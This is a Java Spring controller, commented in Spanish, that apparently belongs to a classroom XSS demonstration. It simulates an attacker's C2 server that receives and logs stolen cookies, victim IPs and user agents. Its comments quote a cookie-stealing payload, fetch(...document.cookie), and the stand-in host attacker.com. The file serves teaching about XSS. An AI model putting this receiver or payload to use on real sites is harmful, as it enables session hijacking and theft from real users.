package com.ciberseguridad.xss.attacker;

import com.ciberseguridad.xss.model.RoboRegistro;
import com.ciberseguridad.xss.repository.RoboRegistroRepository;
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

/**
 * 🕵️ SERVIDOR DEL ATACANTE (C2 / Command & Control Listener)
 *
 * Simula el servidor malicioso referenciado en la Diapositiva 6:
 * https://attacker.com/steal?cookie=
 *
 * Recibe y registra en tiempo real las cookies y credenciales exfiltradas
 * por los payloads de Cross-Site Scripting (XSS).
 */
@RestController
@CrossOrigin(origins = "*")
@RequestMapping("/api/attacker")
public class AttackerC2Controller {

    private final RoboRegistroRepository roboRegistroRepository;

    public AttackerC2Controller(RoboRegistroRepository roboRegistroRepository) {
        this.roboRegistroRepository = roboRegistroRepository;
    }

    /**
     * Endpoint receptor del robo de cookies.
     * Invocado por: fetch('/api/attacker/steal?cookie=' + document.cookie)
     */
    @GetMapping("/steal")
    public ResponseEntity<?> recibirRobo(
            @RequestParam(name = "cookie", defaultValue = "(sin cookie visible)") String cookie,
            HttpServletRequest request) {

        String ip = request.getRemoteAddr();
        String userAgent = request.getHeader("User-Agent");

        RoboRegistro registro = new RoboRegistro(cookie, ip, userAgent);
        roboRegistroRepository.save(registro);

        System.out.println("🚨 [ALERTA ATACANTE C2] ¡Cookie exfiltrada recibida exitosamente!");
        System.out.println("   🍪 Contenido: " + cookie);
        System.out.println("   🌐 IP Víctima: " + ip);

        return ResponseEntity.ok(Map.of(
                "estado", "ROBO_REGISTRADO",
                "mensaje", "Cookie exfiltrada al servidor del atacante con éxito",
                "idRegistro", registro.getId(),
                "cookieCapturada", cookie
        ));
    }

    /**
     * Consulta el registro de cookies exfiltradas para el panel en vivo del atacante.
     */
    @GetMapping("/logs")
    public List<RoboRegistro> obtenerLogsRobo() {
        return roboRegistroRepository.findAllByOrderByFechaDesc();
    }

    /**
     * Limpia los registros para reiniciar la demostración en vivo.
     */
    @DeleteMapping("/logs")
    public ResponseEntity<?> limpiarLogs() {
        roboRegistroRepository.deleteAll();
        return ResponseEntity.ok(Map.of("mensaje", "Historial del servidor del atacante vaciado."));
    }
}
